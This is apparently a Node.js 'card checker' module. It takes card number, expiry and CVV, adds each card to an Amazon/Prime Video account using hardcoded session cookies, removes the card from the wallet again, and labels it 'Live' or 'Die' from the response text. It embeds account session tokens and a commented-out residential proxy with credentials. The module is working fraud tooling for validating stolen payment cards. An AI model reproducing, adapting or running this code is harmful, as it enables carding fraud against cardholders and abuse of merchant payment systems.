const request = require("request");

module.exports = {
  invoke({ cc, mes, ano, cvv }) {
    return new Promise(async (resolve) => {
      const jar = request.jar();

      const getStr = (str, left, right) => {
        try {
          let texto = str.split(left);
          let texto1 = texto[1].split(right);
          return texto1[0];
        } catch (err) {
          return undefined;
        }
      };

      for (;;) {
        var r1 = await this.curl({
          url: `https://www.primevideo.com/region/na/payments-portal/data/widgets2/v1/customer/A35W0TWL2DNVCN/continueWidget`,
          //proxy: `http://binuxy:binuxy7_country-br@geo.iproyal.com:12321`,
          method: "POST",
          headers: {
            Host: "www.primevideo.com",
            "X-Requested-With": "XMLHttpRequest",
            dpr: "1",
            downlink: "10",
            "APX-Widget-Info": "Subs:AmazonVideo/desktop/iNe8Hu0M5If5",
            "sec-ch-ua-platform": '"Windows"',
            "device-memory": "8",
            "Widget-Ajax-Attempt-Count": "0",
            rtt: "50",
            "sec-ch-ua-mobile": "?0",
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
            "viewport-width": "1920",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            Accept: "application/json, text/javascript, */*; q=0.01",
            "sec-ch-viewport-width": "1920",
            "sec-ch-dpr": "1",
            Origin: "https://www.primevideo.com",
            Referer:
              "https://www.primevideo.com/region/na/gp/video/acquisition/workflow/ref=atv_set_ps_1c_e?workflowType=PaymentFixup-TVOD",
            "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
            Cookie:
              'session-id=142-2903531-8486746; i18n-prefs=USD; ubid-main-av=131-0272274-8417432; av-timezone=America/Sao_Paulo; lc-main-av=pt_BR; x-main-av="4jnxEIejIQVW6K?Y9@Mt?TlaWXPaQAJ4Fjm4HWTUCWNOHMEhsilTN?dKzIpWO5US"; at-main-av=Atza|IwEBIJI86qhUERF28K-MoxTKvYExiWpEp-Pb281oh5qYMpvl5aNraOhdCYl0BsSMFyXJ4pHXdaGvZyytiKVTQeKe4ZyqFdsALoQ-F396SbCoAbgGHUgxTEGv_gORKbC1peFYwNEyEMW6xE4-6O50U3NIbKUS1bYqbf3jGpXJgG-BC0dXedqM1F9MH-IJrTvHJW1B8YMdBBBV7fn-KmngFJTRIeNAzbzaET9CAIk1xnLRwvGygTptKbDRONMo_nLN3ZM8AeU; sess-at-main-av="RwItBHa9iduwfuaNfy9Ikn/Wqo9pOZX3ngNKbN4LJvw="; session-token="JJxZTIjml3iav58mm7VLrXWRmQv9qRCyy/70nkpAaw55YTEBaZCH42EDs6gWN6NxPaISLk9GmZi/Zqt6ba0j/tJjbGx0bYVte8B7quiHQUZ+J8TWlwXM78FfKEeFzrBlsMEcC0wCqV8V3KKYP9a/aaAyRBM0hJIyIRrwRhs8DxLN9ro0oi4RZEvdt3evsYp+1lLhXrQ0Ov6pJAEu5666G4CGCr2eyp+0uTgciucJiMevrldwxQlTKpcPXBSIc0uv"; session-id-time=2082787201l; csm-hit=tb:0XP5NE153N7DGQRPMJWR+s-MAFFSDZR0H319XRWGZZ9|1668463592349&t:1668463592349&adb:adblk_no',
          },
          body: `ppw-widgetEvent%3AAddCreditCardEvent=&ppw-jsEnabled=true&ppw-widgetState=4-MS3r2s67ntuaBe5C4-NvaL5IZ7eimWhv_0Dn0Xjysu3DHrodIaMxRkIrIa0ILnQNSxYimZAWANBY4vNMbtu0KdTIErEE6k1ih26LtP52B621yg7yxJHklyKzLp4tsnanaDaha0G_EblN59_5MOLxOr7exyD9pn3g-LIhCHuJMflUl0ui71YxGey9vZ_RM3Gc8O194nP0c7BMXe3XYDeNYw2W_9RuWxt6I6nwYUAAI78bGcWDVHdow491P-j8HtZ_-5CL3_cg4gazu0bYC2tYb1KMyk8Bd7Mb7HZhKILj4yuD872VLSVAedeKnbXqna6Yzoqt1_bbweicnY5Z9L82QzqEZ1SuBBh_SP2LAEHNSdk2NIOWcal14voOiHaBNLrWaBaNiWovOYVx09yu-hC2O6S3TRVSBq-h25bCxRS0mKkJLwfpu_3xIsLm1XI6z6jGUdRc1yFtbBPDXN9rDEdzm3IADRub-_0CZf5YyhS6wPoARFul9jwigU0Kf_kgu1Or_9IWbX-VYkEHSnDkROsz_bEb4PvNUAcNFF1I8tgdNpgi2p4eHAcppSCfeH5TuGJ6r7o0S3ubT0gzi3IaTrsdzK2HN1Gp5OJhWCOPP8XUAUZEEhFQVykF7a3m9j7uPIOj8rdH2_QCTXLfsjmvcb_beZs7KlCtKcicJA_CrDGiXO1OJVAnOUEuRwmSa3PftljDXA-BhlZqxW5fmcMXSUYepudbQDwha6g-3FzEl12fR0JJ2NZ4w9ly54uwVlDWEE-4djh4LRJmlFlaRptAO9lHdudhMPLaYh2-ASkyPsd7Q_i3m2-vNww3X1ALs7eEf2e8aG7wUeAXUMKLfMTEnKxkaaIXxJt3VMHYSrIwmG6XntN1Mxj_aPvm6IbrtYqno6oIFJqJXHoEG_6TtYK9jpGv230S04yU2-HX88LiLCHs4rDZuyqhn73dngJAb6q52R-ck3nvEXoMbwyp8TbvVv5LPdW4z8T1pk9ooEseh0E_KuVOYtnkuEFiQ9ibKNWUnS5OO4ADHQkNDeN-3p-285Lr1XM_UkykAQZdwb5Fn1ATfC_0SqR-Y4knkZ_Q_LGLvrTVGjq8kIeB0O5QplYtcqHuqfEEbGfJgvV22elhf9hGM3gvipcjVnnvTOb4MCX9T8vKVEHFaUuZCotcI9NPXbV196sWimshCz9QP-bezZ1Y4qNQQ80oAG45pAhBhSFZdF9Cz42SinWG6wwhpxSRa3SYoHO0-TtAtzxwO7c9rUE6kCy3NPfGOGzfh3NWXfID7O0eXjZfvHr-tNzRaPCCc5YR1Ub2Wouq4u7ZogHMAE8npAOgx0UfYzmEoLICGUtUWVjs2EbD_Zvv4Gv1QB3ONYwysKauSzuh4dqb2bho-IZC_hCSlb2oy1XXxkXU_JndlUvSo_VgnibsJZuvEyhAjvZ9kh8KO4ao5_awnhfM1Qv7IA1Br5QIsc8dpwmIEM3CiN2brxcep3f6HL10plmlgM0ICbJ56BsPYQ2H3oyIPYE7eB4mNdY6lllvjIvPw6OGKryN7q58M245bMRG0aiOzNrnhfLKSU0nAoKaT20j2YzDRW-C_L1aPuVeRIjpiA4X3uR9yR3wZJUkKf_b_oc9TokVOKIIb-0Ak-SMHcBvW1Yj1H3lxwtl7AaNHEPgKymCiyie71HpzsEsiN8h_Tw4jtxYbAG0e7N52Edvb9ai7_ivdJyvakRXuwgp4-ROqAtTEJ1W6QiVBXFKUHclAi3WHir94zWygbGmRE8eKOmqRyCDd7zdGcr-txOdvOsc6KigNZQ9Bufd&ie=UTF-8&ppw-accountHolderName=ELAINE+JOSE+DA+CRUZ&addCreditCardNumber=${cc}&ppw-expirationDate_month=${mes}&ppw-expirationDate_year=${ano}`,
          followAllRedirects: true,
          strictSSL: false,
          jar,
        });
        //console.log(r1.body);
        if (r1.response && r1.response.statusCode) break;
        else console.log(r1.body);
      }

      const token = getStr(r1.body, "addressSelection-", '\\":');
      const token3 = getStr(r1.body, '"ppw-widgetState\\" value=\\"', '\\"');
      const token4 = getStr(r1.body, 'data-address-id=\\"', '\\"');
      const token5 = getStr(r1.body, 'customerId\\":\\"', '\\"');

      for (;;) {
        var r2 = await this.curl({
          url: `https://www.primevideo.com/region/na/payments-portal/data/widgets2/v1/customer/A35W0TWL2DNVCN/continueWidget`,
          //proxy: `http://binuxy:binuxy7_country-br@geo.iproyal.com:12321`,
          method: "POST",
          headers: {
            Host: "www.primevideo.com",
            "X-Requested-With": "XMLHttpRequest",
            dpr: "1",
            downlink: "10",
            "APX-Widget-Info": "Subs:AmazonVideo/desktop/k4d3ykXzCt8w",
            "sec-ch-ua-platform": '"Windows"',
            "device-memory": "8",
            "Widget-Ajax-Attempt-Count": "0",
            rtt: "50",
            "sec-ch-ua-mobile": "?0",
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
            "viewport-width": "1920",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            Accept: "application/json, text/javascript, */*; q=0.01",
            "sec-ch-viewport-width": "1920",
            "sec-ch-dpr": "1",
            Origin: "https://www.primevideo.com",
            Referer:
              "https://www.primevideo.com/region/na/gp/video/acquisition/workflow/ref=atv_set_ps_1c_e?workflowType=PaymentFixup-TVOD",
            "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
            Cookie:
              'session-id=142-2903531-8486746; i18n-prefs=USD; ubid-main-av=131-0272274-8417432; av-timezone=America/Sao_Paulo; lc-main-av=pt_BR; x-main-av="4jnxEIejIQVW6K?Y9@Mt?TlaWXPaQAJ4Fjm4HWTUCWNOHMEhsilTN?dKzIpWO5US"; at-main-av=Atza|IwEBIJI86qhUERF28K-MoxTKvYExiWpEp-Pb281oh5qYMpvl5aNraOhdCYl0BsSMFyXJ4pHXdaGvZyytiKVTQeKe4ZyqFdsALoQ-F396SbCoAbgGHUgxTEGv_gORKbC1peFYwNEyEMW6xE4-6O50U3NIbKUS1bYqbf3jGpXJgG-BC0dXedqM1F9MH-IJrTvHJW1B8YMdBBBV7fn-KmngFJTRIeNAzbzaET9CAIk1xnLRwvGygTptKbDRONMo_nLN3ZM8AeU; sess-at-main-av="RwItBHa9iduwfuaNfy9Ikn/Wqo9pOZX3ngNKbN4LJvw="; session-token="3OB+9B7E6N/LvDHTROfMg7vruE2wQF4HKIT7LcF0Iclt3ugUNjxhKKRjo02z3AxJkMkEgDXjwDP+Oo6AOEZbjQlIpDQAk9Ra4BDd/A6wqfHn0WNs0yr0+QsAVXuEyYSwXtUHvjGDPij75vL7Wct5FA+9R93sBD1cSw1Nwr7ir1Z2mkY4zAohScjPL+0g1sXbcS/aHDo9AzYb9P8knDcFiEEQ+MlH/TCqikoGC4tWCt1AabP2b2AnooeqOsy/r4ok5K+jvfymKAg="; session-id-time=2082787201l; csm-hit=tb:T029S08DW31RJ639YATQ+s-6TAA81WR35PPSSSDX6FR|1668465005058&t:16684650050583&adb:adblk_no',
          },
          body: `ppw-widgetEvent%3ASelectAddressEvent=&ppw-jsEnabled=true&ppw-widgetState=${token3}&ie=UTF-8&ppw-pickAddressType=Inline&ppw-addressSelection=${token4}`,
          followAllRedirects: false,
          strictSSL: false,
          jar,
        });
        if (r2.response && r2.response.statusCode) break;
        else console.log(r2.body);
      }

      const token1 = getStr(r2.body, 'ppw-widgetState\\" value=\\"', '\\"');
      const token2 = getStr(r2.body, 'paymentInstrumentId":"', '"');

      for (;;) {
        var r3 = await this.curl({
          url: `https://www.primevideo.com.br/region/na/payments-portal/data/widgets2/v1/customer/A35W0TWL2DNVCN/continueWidget`,
          //proxy: `http://binuxy:binuxy7_country-br@geo.iproyal.com:12321`,
          method: "POST",
          headers: {
            Host: "www.primevideo.com",
            "sec-ch-device-memory": "8",
            "X-Requested-With": "XMLHttpRequest",
            dpr: "1",
            downlink: "3.2",
            "APX-Widget-Info": "Subs:AmazonVideo/desktop/k4d3ykXzCt8w",
            "sec-ch-ua-platform": '"Windows"',
            "device-memory": "8",
            "Widget-Ajax-Attempt-Count": "0",
            rtt: "150",
            "sec-ch-ua-mobile": "?0",
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
            "viewport-width": "1920",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            Accept: "application/json, text/javascript, */*; q=0.01",
            "sec-ch-viewport-width": "1920",
            "sec-ch-dpr": "1",
            ect: "4g",
            Origin: "https://www.primevideo.com",
            Referer:
              "https://www.primevideo.com/region/na/gp/video/acquisition/workflow/ref=atv_set_ps_1c_a?workflowType=PaymentFixup-TVOD",
            "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
            Cookie:
              'session-id=142-2903531-8486746; i18n-prefs=USD; ubid-main-av=131-0272274-8417432; av-timezone=America/Sao_Paulo; lc-main-av=pt_BR; x-main-av="4jnxEIejIQVW6K?Y9@Mt?TlaWXPaQAJ4Fjm4HWTUCWNOHMEhsilTN?dKzIpWO5US"; at-main-av=Atza|IwEBIJI86qhUERF28K-MoxTKvYExiWpEp-Pb281oh5qYMpvl5aNraOhdCYl0BsSMFyXJ4pHXdaGvZyytiKVTQeKe4ZyqFdsALoQ-F396SbCoAbgGHUgxTEGv_gORKbC1peFYwNEyEMW6xE4-6O50U3NIbKUS1bYqbf3jGpXJgG-BC0dXedqM1F9MH-IJrTvHJW1B8YMdBBBV7fn-KmngFJTRIeNAzbzaET9CAIk1xnLRwvGygTptKbDRONMo_nLN3ZM8AeU; sess-at-main-av="RwItBHa9iduwfuaNfy9Ikn/Wqo9pOZX3ngNKbN4LJvw="; session-token="3OB+9B7E6N/LvDHTROfMg7vruE2wQF4HKIT7LcF0Iclt3ugUNjxhKKRjo02z3AxJkMkEgDXjwDP+Oo6AOEZbjQlIpDQAk9Ra4BDd/A6wqfHn0WNs0yr0+QsAVXuEyYSwXtUHvjGDPij75vL7Wct5FA+9R93sBD1cSw1Nwr7ir1Z2mkY4zAohScjPL+0g1sXbcS/aHDo9AzYb9P8knDcFiEEQ+MlH/TCqikoGC4tWCt1AabP2b2AnooeqOsy/r4ok5K+jvfymKAg="; session-id-time=2082787201l; csm-hit=tb:T029S08DW31RJ639YATQ+s-6TAA81WR35PPSSSDX6FR|1668465005058&t:16684650050583&adb:adblk_no',
          },
          body: `ppw-jsEnabled=true&ppw-widgetState=${token1}&ie=UTF-8&ppw-instrumentRowSelection=instrumentId%3D${token2}%26isExpired%3Dfalse%26paymentMethod%3DCC%26tfxEligible%3Dfalse&ppw-widgetEvent%3APreferencePaymentOptionSelectionEvent=`,
          followAllRedirects: true,
          strictSSL: false,
          jar,
        });
        if (r3.response && r3.response.statusCode) break;
        else console.log(r3.body);
      }

      const token8 = getStr(
        r3.body,
        'YA:Wallet\\",\\"serializedState\\":\\"',
        '\\"'
      );

      for (;;) {
        var r4 = await this.curl({
          url: `https://www.amazon.com.br/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo`,
          //proxy: `http://binuxy:binuxy7_country-br@geo.iproyal.com:12321`,
          method: "POST",
          headers: {
            Host: "www.amazon.com.br",
            "device-memory": "8",
            "sec-ch-device-memory": "8",
            dpr: "1",
            "sec-ch-dpr": "1",
            "viewport-width": "1920",
            "sec-ch-viewport-width": "1920",
            rtt: "100",
            downlink: "10",
            ect: "4g",
            "sec-ch-ua":
              '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "Upgrade-Insecure-Requests": "1",
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
            Accept:
              "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Service-Worker-Navigation-Preload": "true",
            Referer:
              "https://www.amazon.com.br/gp/css/homepage.html?ref_=nav_AccountFlyout_ya",
            "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
            Cookie:
              'session-id=135-0739249-7565928; ubid-acbbr=134-4775271-2133669; sst-acbbr=Sst1|PQFB7i8gWBQShJHlKaSf5rIrCeZiY2IzCZMesb1Y6zmUj2jiLjEdiBVW06WkDq-yyfNPFoJkdn3qZO7duMe45EMIMEjYyH5uixuKE96FBwPvaD182cSchuy6nHCHv2kTo68fU9UCJXv2cRI_vXtdxDRzGvX0z2JNAI0PjP034ihtxPcY6jq5bJDhRmv-9-4Y-XLnGPIacQLgso6GtExaErPACmGccZ2zTTcKIOvIlWXW6050AU6gRmEHBk9ecVqBVccg8xvJTAJ1lbO3LGCk4KGFeMhsm5T4KZyRMYW02UQC3KM; lc-acbbr=pt_BR; i18n-prefs=BRL; x-acbbr="SkbjO3sPVqFwKh3Gq5RSpdARoMJ9w6FRG3gXILY1FLqhPT7PW0NAHBf7IV7d3r6U"; at-acbbr=Atza|IwEBIJWvUENJCrVqKOCJQ2XOvHv9rbZcP7tPsBCqTadhm6RMG-B6afSNVBR4HK8rSY0pvrpqeKNyeJU8tah7RhGBz6qA3FjMFNx99NioA5MZAlAXcH0AEI4cUXryntjPvdU4hLySs-L960CD2XMdkzAN4P_DWsNMvaYYaS-xrglG11nwsdLI6h_dCm3USO2zfjcR8ETOTLpA9xC37O5fJrpbDTz2; sess-at-acbbr="whcSxpjwqoFee8n6cLsjFaFm2xWmALQfufEE6UjWcQ0="; session-token=nNMQi52Qwpphmx12QTtgjkVLxvoYGECfIkerQ4DUulC4AuO71RCIc7ZIPstYZKKWx5s71O9aB8U3+qe/a67bunvSZu8nofi5OYBHJuN2V23CaRq5Sq60cOksEo+EdiOrMkBaJE76MlvbVVxW+Qk2jE0pAxwMqFSwPtF8gjLcbFrNbU/OFY0TVdrmkOp2zl/Kmbh5ySdY8Knec4oekEFkIrpzztLmWVdFF1glWnPfFLEa8P/fSOw/X3eAPSrq1rXL; session-id-time=2082787201l; csm-hit=tb:6R9T8MT8SXCNHBGT8MX2+s-s-S3GHYK5VRFKKYM4K6K3T|1668467360641&t:1664380504194&adb:adblk_no',
          },
          body: ``,
          followAllRedirects: true,
          strictSSL: false,
          jar,
        });
        if (r4.response && r4.response.statusCode) break;
        else console.log(r4.body);
      }

      const token15 = getStr(r4.body, '":{"selectedInstrumentId":"', '"');
      const token16 = getStr(r4.body, 'YA:Wallet","serializedState":"', '"');

      for (;;) {
        var r5 = await this.curl({
          url: `https://www.amazon.com.br/payments-portal/data/widgets2/v1/customer/A35W0TWL2DNVCN/continueWidget`,
          //proxy: `http://binuxy:binuxy7_country-br@geo.iproyal.com:12321`,
          method: "POST",
          headers: {
            Host: "www.amazon.com.br",
            "sec-ch-device-memory": "8",
            "X-Requested-With": "XMLHttpRequest",
            dpr: "1",
            downlink: "5.2",
            "APX-Widget-Info": "YA:Wallet/desktop/5pkCm5PY237e",
            "sec-ch-ua-platform": '"Windows"',
            "device-memory": "8",
            "Widget-Ajax-Attempt-Count": "0",
            rtt: "150",
            "sec-ch-ua-mobile": "?0",
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
            "viewport-width": "1058",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            Accept: "application/json, text/javascript, */*; q=0.01",
            "sec-ch-viewport-width": "1058",
            "sec-ch-dpr": "1",
            ect: "4g",
            Origin: "https://www.amazon.com.br",
            Referer:
              "https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo",
            "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
            Cookie:
              'session-id=135-0739249-7565928; ubid-acbbr=134-4775271-2133669; sst-acbbr=Sst1|PQFB7i8gWBQShJHlKaSf5rIrCeZiY2IzCZMesb1Y6zmUj2jiLjEdiBVW06WkDq-yyfNPFoJkdn3qZO7duMe45EMIMEjYyH5uixuKE96FBwPvaD182cSchuy6nHCHv2kTo68fU9UCJXv2cRI_vXtdxDRzGvX0z2JNAI0PjP034ihtxPcY6jq5bJDhRmv-9-4Y-XLnGPIacQLgso6GtExaErPACmGccZ2zTTcKIOvIlWXW6050AU6gRmEHBk9ecVqBVccg8xvJTAJ1lbO3LGCk4KGFeMhsm5T4KZyRMYW02UQC3KM; lc-acbbr=pt_BR; i18n-prefs=BRL; x-acbbr="SkbjO3sPVqFwKh3Gq5RSpdARoMJ9w6FRG3gXILY1FLqhPT7PW0NAHBf7IV7d3r6U"; at-acbbr=Atza|IwEBIJWvUENJCrVqKOCJQ2XOvHv9rbZcP7tPsBCqTadhm6RMG-B6afSNVBR4HK8rSY0pvrpqeKNyeJU8tah7RhGBz6qA3FjMFNx99NioA5MZAlAXcH0AEI4cUXryntjPvdU4hLySs-L960CD2XMdkzAN4P_DWsNMvaYYaS-xrglG11nwsdLI6h_dCm3USO2zfjcR8ETOTLpA9xC37O5fJrpbDTz2; sess-at-acbbr="whcSxpjwqoFee8n6cLsjFaFm2xWmALQfufEE6UjWcQ0="; session-token="Cw+6fJpWEi5l59L9FZPyQwxkRBhRnwVU3r79vQcBzsBdOLmT+Pty+KFHPnBOgQ3wBheuZhrIs0e/HJBqX6fZ3eYMhAbZWLIyxsAA4/8nXd5QHiE2jcWhJVgCeDImVaErjEe/Laa+95gkmplHbSLxNH2IRDzktJrwB2jZo2aOmuCuAXNv4ZWvetDII6o83TglkVRUKddW+8+X9dYo8Zc83fJNcB69/Qqib7AQ1CUTvfGnbpTTtKiD/67bL9HcJceSaRDqEatj/os="; session-id-time=2082787201l; csm-hit=tb:S3GHYK5VRFKKYM4K6K3T+s-SNNR111RKZV9YC6Q0T0W|1668468494318&t:1664380504194&adb:adblk_no',
          },
          body: `ppw-jsEnabled=true&ppw-widgetState=${token16}&ppw-widgetEvent=StartEditEvent&ppw-iid=${token15}&ppw-paymentMethodType=Card&ppw-isDefaultPaymentMethod=false`,
          followAllRedirects: false,
          strictSSL: false,
          jar,
        });
        if (r5.response && r5.response.statusCode) break;
        else console.log(r5.body);
      }

      const token17 = getStr(r5.body, 'ppw-widgetState\\" value=\\"', '\\"');

      for (;;) {
        var r6 = await this.curl({
          url: `https://www.amazon.com.br/payments-portal/data/widgets2/v1/customer/A35W0TWL2DNVCN/continueWidget?sif_profile=APX-Encrypt-All-NA`,
          //proxy: `http://binuxy:binuxy7_country-br@geo.iproyal.com:12321`,
          method: "POST",
          headers: {
            Host: "www.amazon.com.br",
            "sec-ch-device-memory": "8",
            "X-Requested-With": "XMLHttpRequest",
            dpr: "1",
            downlink: "5.2",
            "APX-Widget-Info": "YA:Wallet/desktop/5pkCm5PY237e",
            "sec-ch-ua-platform": '"Windows"',
            "device-memory": "8",
            "Widget-Ajax-Attempt-Count": "0",
            rtt: "150",
            "sec-ch-ua-mobile": "?0",
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
            "viewport-width": "1920",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            Accept: "application/json, text/javascript, */*; q=0.01",
            "sec-ch-viewport-width": "1920",
            "sec-ch-dpr": "1",
            ect: "4g",
            Origin: "https://www.amazon.com.br",
            Referer:
              "https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo",
            "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
            Cookie:
              'session-id=135-0739249-7565928; ubid-acbbr=134-4775271-2133669; sst-acbbr=Sst1|PQFB7i8gWBQShJHlKaSf5rIrCeZiY2IzCZMesb1Y6zmUj2jiLjEdiBVW06WkDq-yyfNPFoJkdn3qZO7duMe45EMIMEjYyH5uixuKE96FBwPvaD182cSchuy6nHCHv2kTo68fU9UCJXv2cRI_vXtdxDRzGvX0z2JNAI0PjP034ihtxPcY6jq5bJDhRmv-9-4Y-XLnGPIacQLgso6GtExaErPACmGccZ2zTTcKIOvIlWXW6050AU6gRmEHBk9ecVqBVccg8xvJTAJ1lbO3LGCk4KGFeMhsm5T4KZyRMYW02UQC3KM; lc-acbbr=pt_BR; i18n-prefs=BRL; x-acbbr="SkbjO3sPVqFwKh3Gq5RSpdARoMJ9w6FRG3gXILY1FLqhPT7PW0NAHBf7IV7d3r6U"; at-acbbr=Atza|IwEBIJWvUENJCrVqKOCJQ2XOvHv9rbZcP7tPsBCqTadhm6RMG-B6afSNVBR4HK8rSY0pvrpqeKNyeJU8tah7RhGBz6qA3FjMFNx99NioA5MZAlAXcH0AEI4cUXryntjPvdU4hLySs-L960CD2XMdkzAN4P_DWsNMvaYYaS-xrglG11nwsdLI6h_dCm3USO2zfjcR8ETOTLpA9xC37O5fJrpbDTz2; sess-at-acbbr="whcSxpjwqoFee8n6cLsjFaFm2xWmALQfufEE6UjWcQ0="; session-token="Cw+6fJpWEi5l59L9FZPyQwxkRBhRnwVU3r79vQcBzsBdOLmT+Pty+KFHPnBOgQ3wBheuZhrIs0e/HJBqX6fZ3eYMhAbZWLIyxsAA4/8nXd5QHiE2jcWhJVgCeDImVaErjEe/Laa+95gkmplHbSLxNH2IRDzktJrwB2jZo2aOmuCuAXNv4ZWvetDII6o83TglkVRUKddW+8+X9dYo8Zc83fJNcB69/Qqib7AQ1CUTvfGnbpTTtKiD/67bL9HcJceSaRDqEatj/os="; session-id-time=2082787201l; csm-hit=tb:S3GHYK5VRFKKYM4K6K3T+s-SNNR111RKZV9YC6Q0T0W|1668468494318&t:1664380504194&adb:adblk_no',
          },
          body: `ppw-widgetEvent%3AStartDeleteEvent%3A%7B%22iid%22%3A%22${token2}%22%2C%22paymentMethodCode%22%3A%22CC%22%7D=Remove+from+wallet&ppw-jsEnabled=true&ppw-widgetState=${token17}&ie=UTF-8&ppw-accountHolderName=luciano+jr&ppw-expirationDate_month=${mes}&ppw-expirationDate_year=${ano}`,
          followAllRedirects: false,
          strictSSL: false,
          jar,
        });
        if (r6.response && r6.response.statusCode) break;
        else console.log(r6.body);
      }

      const token18 = getStr(r6.body, 'ppw-widgetState\\" value=\\"', '\\"');

      for (;;) {
        var r7 = await this.curl({
          url: `https://www.amazon.com.br/payments-portal/data/widgets2/v1/customer/A35W0TWL2DNVCN/continueWidget`,
          //proxy: `http://binuxy:binuxy7_country-br@geo.iproyal.com:12321`,
          method: "POST",
          headers: {
            Host: "www.amazon.com.br",
            "sec-ch-device-memory": "8",
            "X-Requested-With": "XMLHttpRequest",
            dpr: "1",
            downlink: "5.2",
            "APX-Widget-Info": "YA:Wallet/desktop/5pkCm5PY237e",
            "sec-ch-ua-platform": '"Windows"',
            "device-memory": "8",
            "Widget-Ajax-Attempt-Count": "0",
            rtt: "150",
            "sec-ch-ua-mobile": "?0",
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
            "viewport-width": "1920",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            Accept: "application/json, text/javascript, */*; q=0.01",
            "sec-ch-viewport-width": "1920",
            "sec-ch-dpr": "1",
            ect: "4g",
            Origin: "https://www.amazon.com.br",
            Referer:
              "https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo",
            "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
            Cookie:
              'session-id=135-0739249-7565928; ubid-acbbr=134-4775271-2133669; sst-acbbr=Sst1|PQFB7i8gWBQShJHlKaSf5rIrCeZiY2IzCZMesb1Y6zmUj2jiLjEdiBVW06WkDq-yyfNPFoJkdn3qZO7duMe45EMIMEjYyH5uixuKE96FBwPvaD182cSchuy6nHCHv2kTo68fU9UCJXv2cRI_vXtdxDRzGvX0z2JNAI0PjP034ihtxPcY6jq5bJDhRmv-9-4Y-XLnGPIacQLgso6GtExaErPACmGccZ2zTTcKIOvIlWXW6050AU6gRmEHBk9ecVqBVccg8xvJTAJ1lbO3LGCk4KGFeMhsm5T4KZyRMYW02UQC3KM; lc-acbbr=pt_BR; i18n-prefs=BRL; x-acbbr="SkbjO3sPVqFwKh3Gq5RSpdARoMJ9w6FRG3gXILY1FLqhPT7PW0NAHBf7IV7d3r6U"; at-acbbr=Atza|IwEBIJWvUENJCrVqKOCJQ2XOvHv9rbZcP7tPsBCqTadhm6RMG-B6afSNVBR4HK8rSY0pvrpqeKNyeJU8tah7RhGBz6qA3FjMFNx99NioA5MZAlAXcH0AEI4cUXryntjPvdU4hLySs-L960CD2XMdkzAN4P_DWsNMvaYYaS-xrglG11nwsdLI6h_dCm3USO2zfjcR8ETOTLpA9xC37O5fJrpbDTz2; sess-at-acbbr="whcSxpjwqoFee8n6cLsjFaFm2xWmALQfufEE6UjWcQ0="; session-token="Cw+6fJpWEi5l59L9FZPyQwxkRBhRnwVU3r79vQcBzsBdOLmT+Pty+KFHPnBOgQ3wBheuZhrIs0e/HJBqX6fZ3eYMhAbZWLIyxsAA4/8nXd5QHiE2jcWhJVgCeDImVaErjEe/Laa+95gkmplHbSLxNH2IRDzktJrwB2jZo2aOmuCuAXNv4ZWvetDII6o83TglkVRUKddW+8+X9dYo8Zc83fJNcB69/Qqib7AQ1CUTvfGnbpTTtKiD/67bL9HcJceSaRDqEatj/os="; session-id-time=2082787201l; csm-hit=tb:S3GHYK5VRFKKYM4K6K3T+s-SNNR111RKZV9YC6Q0T0W|1668468494318&t:1664380504194&adb:adblk_no',
          },
          body: `ppw-jsEnabled=true&ppw-widgetState=${token18}&ie=UTF-8&ppw-widgetEvent=DeleteInstrumentEvent`,
          followAllRedirects: true,
          strictSSL: false,
          jar,
        });

        if (r7.response && r7.response.statusCode) break;
        else console.log(r7.body);
      }

      console.log(r3.body);
      if (
        r3.body &&
        r3.body.includes(`payStationVerificationId":"","preferenceId":"`)
      )
        return resolve({ status: 0, msg: `Live: ${cc}|${mes}|${ano}|${cvv}` });
      if (r3.body && r3.body.includes(`Houve um problema`))
        return resolve({ status: 1, msg: `Die: ${cc}|${mes}|${ano}|${cvv} - Retorno: Cartão Recusado` });
      if (r3.body && r3.body.includes(`incorreto`))
        return resolve({ status: 1, msg: `Die: ${cc}|${mes}|${ano}|${cvv} - Retorno Cartão Inválido` });
      else resolve({ status: 1, msg: "Erro Desconhecido" });
    });
